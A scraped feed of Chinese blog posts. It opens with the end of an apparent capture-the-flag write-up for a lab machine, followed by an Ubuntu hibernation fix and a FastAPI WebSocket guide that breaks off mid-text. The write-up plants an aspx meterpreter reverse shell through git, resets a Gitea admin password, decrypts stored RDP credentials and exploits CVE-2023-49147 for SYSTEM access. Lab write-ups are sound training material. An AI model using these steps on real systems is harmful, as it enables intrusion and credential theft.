\"ellen.freeman@localhost:ellen.freeman/dev-scripts.git\",\n    \"clone_url\": \"http://localhost:3000/ellen.freeman/dev-scripts.git\",\n    \"original_url\": \"\",\n    \"website\": \"\",\n    \"stars_count\": 0,\n    \"forks_count\": 0,\n    \"watchers_count\": 1,\n    \"open_issues_count\": 0,\n    \"open_pr_counter\": 0,\n    \"release_counter\": 0,\n    \"default_branch\": \"main\",\n    \"archived\": false,\n    \"created_at\": \"2023-12-27T11:17:47-08:00\",\n    \"updated_at\": \"2023-12-27T11:36:42-08:00\",\n    \"archived_at\": \"1969-12-31T16:00:00-08:00\",\n    \"permissions\": {\n      \"admin\": true,\n      \"push\": true,\n      \"pull\": true\n    },\n    \"has_issues\": true,\n    \"internal_tracker\": {\n      \"enable_time_tracker\": true,\n      \"allow_only_contributors_to_track_time\": true,\n      \"enable_issue_dependencies\": true\n    },\n    \"has_wiki\": true,\n    \"has_pull_requests\": true,\n    \"has_projects\": true,\n    \"has_releases\": true,\n    \"has_packages\": true,\n    \"has_actions\": false,\n    \"ignore_whitespace_conflicts\": false,\n    \"allow_merge_commits\": true,\n    \"allow_rebase\": true,\n    \"allow_rebase_explicit\": true,\n    \"allow_squash_merge\": true,\n    \"allow_rebase_update\": true,\n    \"default_delete_branch_after_merge\": false,\n    \"default_merge_style\": \"merge\",\n    \"default_allow_maintainer_edit\": false,\n    \"avatar_url\": \"\",\n    \"internal\": false,\n    \"mirror_interval\": \"\",\n    \"mirror_updated\": \"0001-01-01T00:00:00Z\",\n    \"repo_transfer\": null\n  },\n  {\n    \"id\": 5,\n    \"owner\": {\n      \"id\": 2,\n      \"login\": \"ellen.freeman\",\n      \"login_name\": \"\",\n      \"full_name\": \"\",\n      \"email\": \"ellen.freeman@lock.vl\",\n      \"avatar_url\": \"http://localhost:3000/avatar/1aea7e43e6bb8891439a37854255ed74\",\n      \"language\": \"\",\n      \"is_admin\": false,\n      \"last_login\": \"0001-01-01T00:00:00Z\",\n      \"created\": \"2023-12-27T11:13:10-08:00\",\n      \"restricted\": false,\n      \"active\": false,\n      \"prohibit_login\": false,\n      \"location\": \"\",\n      \"website\": \"\",\n      \"description\": \"\",\n      \"visibility\": \"public\",\n      \"followers_count\": 0,\n      \"following_count\": 0,\n      \"starred_repos_count\": 0,\n      \"username\": \"ellen.freeman\"\n    },\n    \"name\": \"website\",\n    \"full_name\": \"ellen.freeman/website\",\n    \"description\": \"\",\n    \"empty\": false,\n    \"private\": true,\n    \"fork\": false,\n    \"template\": false,\n    \"parent\": null,\n    \"mirror\": false,\n    \"size\": 7370,\n    \"language\": \"CSS\",\n    \"languages_url\": \"http://localhost:3000/api/v1/repos/ellen.freeman/website/languages\",\n    \"html_url\": \"http://localhost:3000/ellen.freeman/website\",\n    \"url\": \"http://localhost:3000/api/v1/repos/ellen.freeman/website\",\n    \"link\": \"\",\n    \"ssh_url\": \"ellen.freeman@localhost:ellen.freeman/website.git\",\n    \"clone_url\": \"http://localhost:3000/ellen.freeman/website.git\",\n    \"original_url\": \"\",\n    \"website\": \"\",\n    \"stars_count\": 0,\n    \"forks_count\": 0,\n    \"watchers_count\": 1,\n    \"open_issues_count\": 0,\n    \"open_pr_counter\": 0,\n    \"release_counter\": 0,\n    \"default_branch\": \"main\",\n    \"archived\": false,\n    \"created_at\": \"2023-12-27T12:04:52-08:00\",\n    \"updated_at\": \"2024-01-18T10:17:46-08:00\",\n    \"archived_at\": \"1969-12-31T16:00:00-08:00\",\n    \"permissions\": {\n      \"admin\": true,\n      \"push\": true,\n      \"pull\": true\n    },\n    \"has_issues\": true,\n    \"internal_tracker\": {\n      \"enable_time_tracker\": true,\n      \"allow_only_contributors_to_track_time\": true,\n      \"enable_issue_dependencies\": true\n    },\n    \"has_wiki\": true,\n    \"has_pull_requests\": true,\n    \"has_projects\": true,\n    \"has_releases\": true,\n    \"has_packages\": true,\n    \"has_actions\": false,\n    \"ignore_whitespace_conflicts\": false,\n    \"allow_merge_commits\": true,\n    \"allow_rebase\": true,\n    \"allow_rebase_explicit\": true,\n    \"allow_squash_merge\": true,\n    \"allow_rebase_update\": true,\n    \"default_delete_branch_after_merge\": false,\n    \"default_merge_style\": \"merge\",\n    \"default_allow_maintainer_edit\": false,\n    \"avatar_url\": \"\",\n    \"internal\": false,\n    \"mirror_interval\": \"\",\n    \"mirror_updated\": \"0001-01-01T00:00:00Z\",\n    \"repo_transfer\": null\n  }\n]\n\n</code></pre>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: left;\">字段</th>\n<th style=\"text-align: left;\">dev-scripts 仓库</th>\n<th style=\"text-align: left;\">website 仓库</th>\n<th style=\"text-align: left;\">渗透测试解读</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\">仓库 ID</td>\n<td style=\"text-align: left;\">1</td>\n<td style=\"text-align: left;\">5</td>\n<td style=\"text-align: left;\">唯一标识，API 操作时可能用到</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">所属用户</td>\n<td style=\"text-align: left;\">ellen.freeman</td>\n<td style=\"text-align: left;\">ellen.freeman</td>\n<td style=\"text-align: left;\">锁定目标用户，后续可围绕该用户展开枚举</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">仓库全名（full_name）</td>\n<td style=\"text-align: left;\">ellen.freeman/dev-scripts</td>\n<td style=\"text-align: left;\">ellen.freeman/website</td>\n<td style=\"text-align: left;\">克隆 / 访问仓库的核心标识，格式为「用户名 / 仓库名」</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">仓库类型（private）</td>\n<td style=\"text-align: left;\">false（公共）</td>\n<td style=\"text-align: left;\">true（私有）</td>\n<td style=\"text-align: left;\"><code>website</code> 是私有仓库，大概率包含敏感内容（如网站源码、部署脚本），重点关注</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">主要开发语言</td>\n<td style=\"text-align: left;\">Python</td>\n<td style=\"text-align: left;\">CSS</td>\n<td style=\"text-align: left;\">提示仓库内容类型：- dev-scripts：Python 脚本- website：前端 / 网页代码</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">仓库大小</td>\n<td style=\"text-align: left;\">29 KB</td>\n<td style=\"text-align: left;\">7370 KB（约 7.2MB）</td>\n<td style=\"text-align: left;\"><code>website</code> 体积大，内容更丰富，是重点目标</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">权限（permissions）</td>\n<td style=\"text-align: left;\">admin: true / push: true / pull: true</td>\n<td style=\"text-align: left;\">admin: true / push: true / pull: true</td>\n<td style=\"text-align: left;\">你的令牌拥有该仓库的<strong>管理员权限</strong>（可推送 / 修改代码），这是提权关键</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">克隆地址（clone_url）</td>\n<td style=\"text-align: left;\"><a href=\"http://localhost:3000/ellen.freeman/dev-scripts.git\" rel=\"noopener nofollow\" target=\"_blank\">http://localhost:3000/ellen.freeman/dev-scripts.git</a></td>\n<td style=\"text-align: left;\"><a href=\"http://localhost:3000/ellen.freeman/website.git\" rel=\"noopener nofollow\" target=\"_blank\">http://localhost:3000/ellen.freeman/website.git</a></td>\n<td style=\"text-align: left;\">可通过该地址克隆仓库到本地分析内容</td>\n</tr>\n</tbody>\n</table>\n<p>这表明，对该存储库的任何更改都会自动改变正在托管的网站。如果我们查看此目录内的index.html页面，我们会找到我们之前访问的网站的HTML内容。这意味着，我们能够向该存储库提交代码，它将被自动推送到该网站。</p>\n<p>我们改变changelog.txt内容，然后提交后</p>\n<p><img alt=\"image-20260215152533986\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170446301-314526916.png\" /></p>\n<pre><code>git add .\n\ngit commit -m \"mane update\"\n\ngit config --global user.name \"ellen.freeman\"\n\ngit config --global user.email \"ellen.freeman\"\n\ngit push\n\n\n</code></pre>\n<p><img alt=\"image-20260215152638585\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170446608-448487180.png\" /></p>\n<p>这时候再去刷新就可以看到更改了</p>\n<p><img alt=\"image-20260215152659735\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170446910-995116.png\" /></p>\n<h2 id=\"漏洞利用\">漏洞利用</h2>\n<p>既然可以成功修改了服务器的文件，由于从Nmap扫描可以确认Microsoft IIS被用作web服务器</p>\n<p><strong>我们可以上传一个.aspx网页shell以实现远程代码执行。</strong></p>\n<p>我们可以通过msfvenom生成此网页shell</p>\n<pre><code class=\"language-kotlin\">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f aspx &gt; test.aspx\n</code></pre>\n<p><img alt=\"image-20260215152959165\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170447245-1785878927.png\" /></p>\n<p>然后我们使用msfconsole启动监听器，以便在webshell触发后捕获反向shell</p>\n<pre><code>msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST 10.10.16.4;set LPORT 4444;run\"\n</code></pre>\n<pre><code class=\"language-kotlin\">git add test.aspx\n\ngit commit -m \"reverse shell\"\n\ngit push\n</code></pre>\n<p><img alt=\"image-20260215153401988\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170447555-1594619413.png\" /></p>\n<p>再回到website目录下，去访问test.aspx</p>\n<p><img alt=\"image-20260215153529160\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170447889-460690805.png\" /></p>\n<p>得到shell</p>\n<p>在C:\\Gitea\\data下有一个gitea.db的数据库文件</p>\n<p><strong>我们尝试使用445端口smb共享</strong></p>\n<p><img alt=\"image-20260215154933813\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170448243-2103087620.png\" /></p>\n<p>但是没有权限</p>\n<p><strong>使用gitea命令更改管理员密码</strong></p>\n<pre><code class=\"language-kotlin\">.\\gitea admin user change-password -u administrator -p chenzi123\n</code></pre>\n<p><img alt=\"image-20260215155323788\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170448575-1285427875.png\" /></p>\n<p>发现修改成功</p>\n<p><img alt=\"image-20260215155611256\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170448925-118385955.png\" /></p>\n<p>成功登陆</p>\n<p>但是并没有什么东西</p>\n<p><img alt=\"image-20260215160252187\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170449299-764827878.png\" /></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: left;\">字段名</th>\n<th style=\"text-align: left;\">取值</th>\n<th style=\"text-align: left;\">渗透测试解读</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\"><code>EncryptionEngine</code></td>\n<td style=\"text-align: left;\">AES</td>\n<td style=\"text-align: left;\">密码的加密算法是 AES（GCM 模式），这是解密的关键前提</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>BlockCipherMode</code></td>\n<td style=\"text-align: left;\">GCM</td>\n<td style=\"text-align: left;\">AES 的分组密码模式，解密工具需要匹配这个模式</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>KdfIterations</code></td>\n<td style=\"text-align: left;\">1000</td>\n<td style=\"text-align: left;\">密钥派生函数的迭代次数，解密时需要用到</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>Protected</code></td>\n<td style=\"text-align: left;\">sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp</td>\n<td style=\"text-align: left;\">mRemoteNG 的主加密密钥（Base64 编码），解密密码必须依赖这个值</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>Name</code></td>\n<td style=\"text-align: left;\">RDP/Gale</td>\n<td style=\"text-align: left;\">这个连接配置的名称，指向用户 Gale</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>Username</code></td>\n<td style=\"text-align: left;\">Gale.Dekarios</td>\n<td style=\"text-align: left;\">靶机上的有效用户账号（核心！后续登录 / 提权要用）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>Password</code></td>\n<td style=\"text-align: left;\">TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==</td>\n<td style=\"text-align: left;\">该用户的加密密码（Base64 编码），需要解密成明文</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>Hostname</code></td>\n<td style=\"text-align: left;\">Lock</td>\n<td style=\"text-align: left;\">连接的目标主机名（即靶机本身）</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>Protocol</code></td>\n<td style=\"text-align: left;\">RDP</td>\n<td style=\"text-align: left;\">连接协议是 RDP（远程桌面），端口 3389</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><code>Port</code></td>\n<td style=\"text-align: left;\">3389</td>\n<td style=\"text-align: left;\">RDP 默认端口，解密密码后可尝试远程登录</td>\n</tr>\n</tbody>\n</table>\n<p>加密密码</p>\n<pre><code>TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==\n</code></pre>\n<p><strong>我们可以使用mRemoteNG进行解密</strong></p>\n<pre><code class=\"language-kotlin\">git clone https://github.com/kmahyyg/mremoteng-decrypt\n\npython mremoteng_decrypt.py -rf config.xml\n\n\nUsername: Gale.Dekarios\nHostname: Lock\nPassword: ty8wnW9qCKDosXo6\n</code></pre>\n<p><img alt=\"image-20260215161751842\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170449614-657327311.png\" /></p>\n<p><strong>发现内容信息里有关RDP，成功获取RDP凭据。使用这些凭据，我们可以建立到该机器的RDP会话。</strong></p>\n<pre><code>xfreerdp /v:10.129.234.64 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6\n</code></pre>\n<p><img alt=\"image-20260215162312243\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170449963-870789338.png\" /></p>\n<p>成功在桌面得到flag</p>\n<h2 id=\"权限提升\">权限提升</h2>\n<p><strong>利用CVE-2023-49147中的PDF24漏洞获取NT系统权限</strong></p>\n<p><img alt=\"image-20260215162609383\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170450488-2097604170.png\" /></p>\n<p><img alt=\"image-20260215163334567\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170450920-2092078689.png\" /></p>\n<p><img alt=\"image-20260215163458580\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170451263-28557071.png\" /></p>\n<p>找到了原始安装文件，接下来还需要SetOpLock</p>\n<pre><code>https://github.com/googleprojectzero/symboliclink-testing-tools/releases/tag/v1.0\n</code></pre>\n<p>下载好后直接复制进来就行</p>\n<p><img alt=\"image-20260215163953620\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170451588-2020905226.png\" /></p>\n<p>成功下载后，我们执行以下命令在PDF24使用的faxPrnlnt.log文件上创建oplock</p>\n<pre><code>.\\SetOpLock.exe \"C:\\Program Files\\PDF24\\faxPrnInst.log\" -r\n</code></pre>\n<p><img alt=\"image-20260215164444656\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170451885-1310209373.png\" /></p>\n<p>在oplock机制启动的情况下，我们打开一个新的命令行窗口，并使用易受攻击的PDF24 MSI安装程序触发修复安装。</p>\n<pre><code>msiexec.exe /fa C:\\_install\\pdf24-creator-11.15.1-x64.msi\n</code></pre>\n<p><img alt=\"image-20260215164843232\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170452203-312618466.png\" /></p>\n<p>一直按确定即可</p>\n<p>在得到这个界面时候</p>\n<p><img alt=\"image-20260215165033124\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170452547-762946933.png\" /></p>\n<p><img alt=\"image-20260215165110265\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170452844-2067885426.png\" /></p>\n<p>使用火狐</p>\n<p>然后启动后，使用ctrl+o 输入cmd</p>\n<p><img alt=\"image-20260215165551218\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170453150-1606390944.png\" /></p>\n<p>得到root</p>\n<p><img alt=\"image-20260215165650040\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170453606-846167594.png\" /></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-15 17:05</span>&nbsp;\n<a href=\"https://www.cnblogs.com/DSchenzi\">dynasty_chenzi</a>&nbsp;\n阅读(<span id=\"post_view_count\">22</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "有关Ubuntu在关盖休眠后可行的拯救方法",
      "link": "https://www.cnblogs.com/Ayeking/p/19617986",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/Ayeking/p/19617986\" id=\"cb_post_title_url\" title=\"发布于 2026-02-15 14:05\">\n    <span>有关Ubuntu在关盖休眠后可行的拯救方法</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p> 本人在使用联想小新15（Ubuntu22.04）时遇到了当关盖挂起后再开盖后不久紫屏的情况，我使用更换内核的方法来解决了这样的问题</p>\n<h2 id=\"硬件环境\">硬件环境</h2>\n<ul>\n<li>机型：Lenovo XiaoXin Air 15ALC 2021</li>\n<li>CPU: AMD Ryzen（集成显卡）</li>\n<li>显卡: AMD Radeon Graphics（amdgpu  驱动）</li>\n<li>网卡: Realtek rtw89_8852ae（WiFi 6）</li>\n<li>系统: Ubuntu 24.04/win 10（双系统共存）</li>\n</ul>\n<h2 id=\"问题现象\">问题现象</h2>\n<p> 系统从休眠（Hibernate）状态被唤醒后，正常使用一段时间（几分钟到十几分钟）突然Kernel Panic，随后只能强制关机重启。</p>\n<h3 id=\"关键特征\">关键特征</h3>\n<ul>\n<li>不是立即崩溃而是唤醒后使用一段时间之后才崩溃</li>\n<li>强制重启后系统日志显示正常，无有效错误记录（崩溃时来不及写入）</li>\n</ul>\n<h2 id=\"日志分析\">日志分析</h2>\n<p>通过<code>journalctl -b -1 -p 3</code>查看上次启动的错误日志，发现关键报错:</p>\n<pre><code class=\"language-bash\">kernel: amdgpu 0000:03:00.0: amdgpu: Secure display: Generic Failure.\nkernel: amdgpu 0000:03:00.0: amdgpu: SECUREDISPLAY: query securedisplay TA failed. ret 0x0\n\nkernel: rtw89_8852ae 0000:01:00.0: Update probe request failed\nkernel: rtw89_8852ae 0000:01:00.0: HW scan failed with status: -110\n</code></pre>\n<h3 id=\"错误解读\">错误解读</h3>\n<ol>\n<li><code>amdgpu: Secure display: Generic Failure</code> :AMD显卡在电源状态切换（休眠$\\rightarrow$唤醒）时，PSR（Panel Self Refresh）功能恢复失败</li>\n<li><code>rtw89_8852ae:HW scan failed</code>: Realtek 8852网卡在休眠后Wifi芯片状态异常</li>\n</ol>\n<h3 id=\"根本原因\">根本原因</h3>\n<ol>\n<li>PSR兼容性问题：AMD显卡的PSR节能功能在小新air的eDP面板上实现不完善，休眠后恢复时出现时序错误导致GPU驱动崩溃</li>\n<li>ACPI实现缺陷：联想小新系列的ACPI固件对Linux支持不佳，<code>ideapad_laptop</code>驱动在电源管理事件中处理不当</li>\n<li>内核版本老旧（可能存在）:Ubuntu默认的内核缺乏对小新Air的电源管理补丁</li>\n<li>网卡驱动问题：rtw89驱动在旧内核中对WoWLAN（无线唤醒）的支持不完善</li>\n</ol>\n<h2 id=\"解决方案\">解决方案</h2>\n<ol>\n<li>\n<p>升级内核（核心解决）</p>\n<p>主线内核6.8+已修复AMD PSR和rtw89的电源管理问题，但不知为何本机需要升级到6.14+或更新的HWE内核</p>\n<pre><code class=\"language-bash\">#方案A：安装Ubuntu HWE内核（推荐，带官方维护）\nsudo apt install linux-generic-hwe-24.04\n\n# 方案 B：安装主线内核 6.14（我实际采用的方案）\n# 从 kernel.ubuntu.com 下载：\n# linux-headers-6.14.0-xxx-generic_amd64.deb\n# linux-image-6.14.0-xxx-generic_amd64.deb\n# linux-modules-6.14.0-xxx-generic_amd64.deb\nsudo dpkg -i *.deb\n</code></pre>\n</li>\n<li>\n<p>修改GRUB启动参数<br />\n编辑<code>/etc/default/grub</code>,在<code>GRUB_CMDLINE_LINUX_DEFAULT</code>中添加：</p>\n<pre><code class=\"language-bash\">GRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash amdgpu.dcdebugmask=0x10 modprobe.balcklist=ideapad_laptop\"\n</code></pre>\n<h3 id=\"参数说明\">参数说明</h3>\n<ul>\n<li><code>amdgpu.dcdebugmask=0x10</code>:禁用PSR（Panel Self Refresh），这是紫屏的直接元凶</li>\n<li><code>modprobe.blacklist=ideapad_laptop</code>:禁用联想的WMI热键/电源管理驱动，避免ACPI冲突</li>\n</ul>\n<h3 id=\"更新grub\">更新GRUB</h3>\n<pre><code class=\"language-bash\">sudo update-grub\n</code></pre>\n</li>\n<li>\n<p>更新固件</p>\n<p>确保无线网卡固件为最新</p>\n<pre><code class=\"language-bash\">#查看已安装的内核\nsudo grep menuentry /boot/grub/grub.cfg | grep 6.14\n\n# 设置为默认启动（根据实际版本号调整）\nsudo grub-set-default \"Advanced options for Ubuntu&gt;Ubuntu, with Linux 6.14.0-37-generic\"\nsudo update-grub\n</code></pre>\n<h2 id=\"避坑指南\">避坑指南</h2>\n<ol>\n<li>不要使用Novean：如果使用的是双显卡版本，务必按安装proprietary NVIDIA驱动，不要禁用nouveau</li>\n<li>慎用休眠：Linux笔记本休眠（Hibernate）依赖swap文件且对固件要求苛刻，建议改用睡眠（Suspend）或者关机</li>\n<li>保留旧内核：升级后保留旧内核作为fallback，新内核启动失败时可在GRUB高级选项切回</li>\n</ol>\n<h2 id=\"验证结果\">验证结果</h2>\n<p>重启后执行：</p>\n<pre><code class=\"language-bash\">uname -r\n#输出版本号:6.14.0-37-generic\n\nsystemctl suspend #测试睡眠唤醒\n</code></pre>\n<h2 id=\"总结\">总结</h2>\n<p>小新Air 15 2021这类性价比轻薄本在Linux下的问题具有代表性：</p>\n<ul>\n<li>硬件新固件旧：通常ACPI表只针对Windows调试</li>\n<li>Realtek网卡：rtw89在6.2内核前几乎无法稳定用于休眠场景，建议Intel网卡机型</li>\n<li>AMD核显：相比NVIDIA省心，但是PSR问题困扰2020-2021的多款机型<br />\n如果追求开箱即用dLInux体验建议考虑Dell XPS、ThinkPad T/X系列或者Framework。</li>\n</ul>\n</li>\n</ol>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-15 14:05</span>&nbsp;\n<a href=\"https://www.cnblogs.com/Ayeking\">Ayeking</a>&nbsp;\n阅读(<span id=\"post_view_count\">37</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "FastAPI 实战：WebSocket 从入门到上线，使用避坑指南",
      "link": "https://www.cnblogs.com/ymtianyu/p/19617874",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/ymtianyu/p/19617874\" id=\"cb_post_title_url\" title=\"发布于 2026-02-15 13:13\">\n    <span>FastAPI 实战：WebSocket 从入门到上线，使用避坑指南</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        本文以程序媛的亲身经历，分享 FastAPI 中 WebSocket 的实战技巧与常见陷阱。从基础 echo 服务开始，逐步剖析心跳丢失、认证漏洞、并发瓶颈、优雅关闭、消息格式五大高频问题，并给出可直接落地的代码与配置方案。不讲枯燥理论，只聊真实踩坑后的解决方案，帮你把 WebSocket 连接从“能用”做到“稳如泰山”。\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<div>\n<p style=\"font-size: 18px; font-weight: 500; background-color: rgba(240, 249, 255, 1); padding: 20px; border-radius: 8px;\">💬 你是不是觉得 WebSocket 挺简单的？不就建立个连接，然后 send 和 onmessage 吗？<br />我当初也这么想，直到我做了一个在线协作小工具，上线第一天晚上，服务器直接崩了，用户疯狂吐槽：“怎么画着画着就断了？” 那一晚，我盯着监控面板，才真正明白——<strong style=\"color: rgba(186, 55, 42, 1);\">WebSocket 的坑，不在握手，而在长连接的战场上。</strong></p>\n\n<p style=\"background-color: rgba(242, 244, 248, 1); padding: 15px; border-radius: 8px; font-style: italic; color: rgba(74, 85, 104, 1);\">📌 本文摘要：从 FastAPI 实战出发，分享在生产环境中用 WebSocket 踩过的坑、填坑的方案，以及那些容易忽略的注意事项。读完你不仅能跑通 Demo，还能让连接更稳定，心里更有底。</p>\n<h1 style=\"font-size: 28px; padding-bottom: 8px; margin-top: 30px;\">🚀 FastAPI 实战：WebSocket 使用避坑指南，让你的长连接稳如老狗</h1>\n\n<div>\n<p style=\"font-weight: 600; margin: 0 0 10px;\">🎯 这篇你会得到什么：</p>\n<div style=\"margin-left: 15px;\">\n<p>🔹 第一部分：WebSocket 的本质（用一个餐厅的故事讲透）</p>\n<p>🔹 第二部分：FastAPI 集成 WebSocket 的最小实战（带代码）</p>\n<p>🔹 第三部分：<strong style=\"color: rgba(186, 55, 42, 1);\">5 个最常见翻车点及解决方案</strong>（心跳、认证、并发、部署、异常）</p>\n<p>🔹 第四部分：老程序员的碎碎念（经验总结 + 互动）</p>\n</div>\n</div>\n\n<h2 style=\"font-size: 22px; margin-top: 30px;\">🍳 1. 先从 WebSocket 是什么聊起（一个餐厅的比喻）</h2>\n<p>传统的 HTTP 请求，就像你去餐厅点菜：你喊一声“服务员，来份宫保鸡丁”，然后服务员跑去后厨，把菜端给你，一次交易结束。你要再点个米饭，又得喊一次。</p>\n<p>而 WebSocket 呢？它就像你直接在餐厅包了个雅间，服务员就站在你桌旁，随时听你吩咐：“加点水”、“拿头蒜”、“结账” —— 服务员一直在线，随时响应，省去了反复呼叫的过程。</p>\n<p>FastAPI 对 WebSocket 的支持非常 Pythonic，用起来很顺手，但正因为顺手，容易忽略背后那些“服务员也得休息”、“包间太多会拥挤”的现实问题。</p>\n<h2 style=\"font-size: 22px; margin-top: 30px;\">⚡ 2. 最小实战：一个简单的聊天 echo 服务</h2>\n<p>先来个最基础的，看看 FastAPI 里 WebSocket 长啥样。下面的代码实现了一个 echo 功能：客户端发什么，我就原样返回什么。</p>\n<pre class=\"language-python highlighter-hljs\"><code>from fastapi import FastAPI, WebSocket, WebSocketDisconnect\n\napp = FastAPI()\n\n@app.websocket(\"/ws\")\nasync def websocket_endpoint(websocket: WebSocket):\n    await websocket.accept()\n    try:\n        while True:\n            # 接收客户端消息\n            data = await websocket.receive_text()\n            # 原样返回\n            await websocket.send_text(f\"服务端收到: {data}\")\n    except WebSocketDisconnect:\n        print(\"客户端断开连接\")\n    except Exception as e:\n        print(f\"发生异常: {e}\")\n        # 记得主动关闭连接\n        await websocket.close()</code></pre>\n<p>看着是不是很简单？✨ 但这里已经藏着一个坑：如果客户端异常断开（比如网络闪断），<code style=\"color: rgba(186, 55, 42, 1);\">receive_text()</code> 会抛出 <code style=\"color: rgba(186, 55, 42, 1);\">WebSocketDisconnect</code>，你得捕获它，否则程序会崩溃。我曾经没写这个 try，结果 uvicorn 进程直接挂掉，教训惨痛。</p>\n\n<h2 style=\"font-size: 22px; margin-top: 40px;\">💣 3. 五个让你凌晨三点爬起来填的坑（附解决方案）</h2>\n\n<div style=\"margin: 25px 0;\">\n<p style=\"font-size: 18px; font-weight: 600;\">👉 3.1 连接自动断开？因为没有心跳</p>\n<p>很多云服务商（比如阿里云、AWS）的负载均衡器，如果一段时间内没有数据传输，会认为连接空闲而把它掐掉。这个时间通常是 60 秒左右。</p>\n<p><strong style=\"color: rgba(186, 55, 42, 1);\">解决方案：</strong> 服务端和客户端都要有心跳机制。最简单的做法是客户端每隔 30 秒发一个 ping 帧（或者自定义心跳消息），服务端收到后回复 pong。</p>\n<p>当初我偷懒没做心跳，用户画图时停顿超过 1 分钟就掉线，被产品经理追着打。😭 后来加了个定时器，世界安静了。</p>\n<pre class=\"language-python highlighter-hljs\"><code># 服务端处理心跳的伪代码\nasync def websocket_endpoint(websocket: WebSocket):\n    await websocket.accept()\n    while True:\n        try:\n            # 设置接收超时，如果一段时间没收到任何消息，主动发心跳探测\n            data = await asyncio.wait_for(websocket.receive_text(), timeout=30)\n            # 处理正常消息\n        except asyncio.TimeoutError:\n            # 30 秒没收到消息，主动发送 ping 探测\n            await websocket.send_text(\"__ping__\")  # 自定义心跳\n            # 如果客户端没响应，会在下一次循环触发 WebSocketDisconnect</code></pre>\n</div>\n\n<div style=\"margin: 25px 0;\">\n<p style=\"font-size: 18px; font-weight: 600;\">👉 3.2 WebSocket 握手时如何携带 Token？</p>\n<p>WebSocket 的握手是 HTTP 请求，所以可以在 URL 参数或者 Header 里带 token。但千万<strong style=\"color: rgba(186, 55, 42, 1);\">不要在路径里明文传 token</strong>，会记在日志里！</p>\n<p>推荐的做法：用 <code style=\"color: rgba(186, 55, 42, 